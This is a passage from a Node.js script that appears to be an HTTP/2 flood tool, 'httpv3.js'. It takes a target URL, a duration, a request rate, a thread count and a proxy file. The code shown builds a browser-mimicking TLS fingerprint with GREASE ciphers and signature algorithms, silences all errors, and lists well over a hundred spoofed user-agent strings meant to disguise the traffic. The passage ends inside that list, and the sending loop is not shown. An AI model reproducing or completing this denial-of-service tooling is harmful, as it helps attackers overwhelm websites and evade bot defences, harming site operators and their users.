process.on('uncaughtException', function(er) {
    //console.log(er);
});
process.on('unhandledRejection', function(er) {
    //console.log(er);
});

process.on("SIGHUP", () => {
    return 1;
})
process.on("SIGCHILD", () => {
    return 1;
});

require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
const gradient = require('gradient-string');
const cluster = require("cluster");
const crypto = require("crypto");
const http2 = require("http2");
const http = require('http');
const net = require("net");
const tls = require("tls");
const url = require("url");
const fs = require("fs");
var path = require("path");
var fileName = __filename;
var colors = require("colors");
var file = path.basename(fileName);

if (process.argv.length < 7) {
    console.log('node httpv3.js <url> <time> <requests> <threads> <proxy>'.rainbow);
    process.exit();
}
const ua = require('user-agents');
const { type } = require("os");

const deviceRatios = {
    desktop:64,   
        mobile: 32,    
            tablet: 32     
              };
                
                  let randomDeviceCategory;
                    const randomValue = Math.floor(Math.random() * 10);
                      if (randomValue < deviceRatios.desktop) {
                          randomDeviceCategory = 'desktop';
                            } else if (randomValue < deviceRatios.desktop + deviceRatios.mobile) {
                                randomDeviceCategory = 'mobile';
                                  } else {
                                      randomDeviceCategory = 'tablet';
                                        }
                                          
                                            const userAgent = new ua({
                                                deviceCategory: randomDeviceCategory
                                                  }).toString();
                                                    

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    defaultCiphers.slice(3)
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";"TLSv1_1_method";"TLSv1_2_method";"TLSv1_3_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomCharacters(length) {
    output = ""
    for (let count = 0; count < length; count++) {
        output += randomElement(characters);
    }
    return output;
}

    const args = {
        target: process.argv[2],
        time: process.argv[3],
        rate: process.argv[4],
        threads: process.argv[5],
        proxy: process.argv[6],
        cookie: process.argv[7] || undefined
    }

    const uap = [
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/112.0.5615.46 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 11; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; DCO-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; SO-01K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-N986N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; M2104K10I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SM-A305GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; RMX2061) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2413) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; RMX3363) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Infinix X6815B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1814) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 13; SM-A042F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; M2101K6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Android 10; Mobile; rv:102.0) Gecko/102.0 Firefox/102.0',
'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Avast/111.0.20716.147',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/112.0.1722.34',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0',
'Mozilla/5.0 (Windows NT 10.0; rv:111.0) Gecko/20100101 Firefox/111.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/94.0.0.0 (Edition Yx GX)',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 YaBrowser/23.3.1.806 Yowser/2.5 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 YaBrowser/23.1.2.978 Yowser/2.5 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/110.0.1587.69',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/96.0.0.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/96.0.0.0 (Edition Yx 05)',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15',
'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
     "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
     "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
     "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
     "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
     "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
     "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
     "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
     "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
     "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466737224 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v3494567444137370641 t1171836933865741988 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v8456192580969411449 t894544887429309181 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v4033463474784022088 t7454547885219621689 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v3487728955102158976 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4562041164 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v2028522216649479612 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466765596 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v7057368071126839728 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4531716181114487945 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v7839198237783962048 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2868933807952903034 t1479978021737656703 ath4b3726d5 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4562065068 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2194678058344203461 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v2718743228222662861 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v7590918487987830442 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466784599 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v1609911553678633550 t3428360957270603442 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36/JrKhPNkF-40',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 TeslaBrowser/109.0.5414.75',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/112.0.1722.34',
'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Whale/3.19.166.16 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/90.0.4480.84',
'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0',
'Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/348.0.0.39.118;]',
'Mozilla/5.0 (Linux; Android 10; LM-K500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.56 Mobile Safari/537.36',
'Opera/9.80 (Android; Opera Mini/7.6.40099/191.256; U; en) Presto/2.12.423 Version/12.16',
'Mozilla/5.0 (Linux; Android 11; Scepter 8 Tablet) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; LG-K425) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (X11; Linux armv7l; rv:95.0) Gecko/20100101 Firefox/95.0',
'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4657.124 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4653.100 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; en-US) Gecko/20100101 Firefox/89.0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4691.107 Safari/537.36',
'Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4655.154 Safari/537.36',
'Mozilla/5.0 (Linux; arm_64; Android 11; vivo 1906) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.1.114.00 SA/3 Mobile Safari/537.36',
'SAMSUNG-SM-B313E Opera/9.80 (J2ME/MIDP; Opera Mini/4.5.40318/191.256; U; en) Presto/2.12.423 Version/12.16',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
'ELinks/0.11.1-1.2ubuntu2.2-debian (textmode; Linux 2.6.20-16-generic i686; 80x24-2)',
'Mozilla/5.0 (Linux; Android 12; POCO F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; W-K130-TMV Build/OPM2.171019.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; MITO T10 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; moto g(7) plus Build/QPWS30.61-21-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; SM-G800H Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.114 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; TECNO AB7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; 6.0; Nomi i5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 3.2; en-us; Sony Tablet S Build/THMAS11000) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13',
'Mozilla/5.0 (Linux; Android 7.1.1; SM-J510MN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36 OPR/65.2.3381.61420',
'Mozilla/5.0 (Linux; Android 8.0.0; SM-G930R4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1',
'Opera/9.80 (Android; Opera Mini/20.0.2254/191.256; U; tr) Presto/2.12.423 Version/12.16',
'Mozilla/5.0 (Linux; Android 10; SM-G981V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; moto e5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 EdgA/96.0.1054.62',
'Mozilla/5.0 (Linux; Android 10; GM1917) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4692.56 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SM-A415F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/343.0.0.37.117;]',
'Mozilla/5.0 (Linux; Android 10; moto g power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; BQ-6040L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.92 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.1; ONEPLUS A3010 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7; rv:94.0) Gecko/20100101 Firefox/94.0',
'Mozilla/5.0 (Linux; Android 11; RMX2170) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; Ultra Shine) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36 OPR/36.0.2128.0 OMI/4.8.0.129.Driver3.34, HbbTV/1.1.1 _TV_MT5806/201.003.193.001 (Philips, PUS7805, wired) CE-HTML/1.0 NETTV/4.6.0.2 SignOn/2.0 SmartTvA/5.0.0 WH1.0 en',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v5772271339651569436 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4504021560267656607 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0',
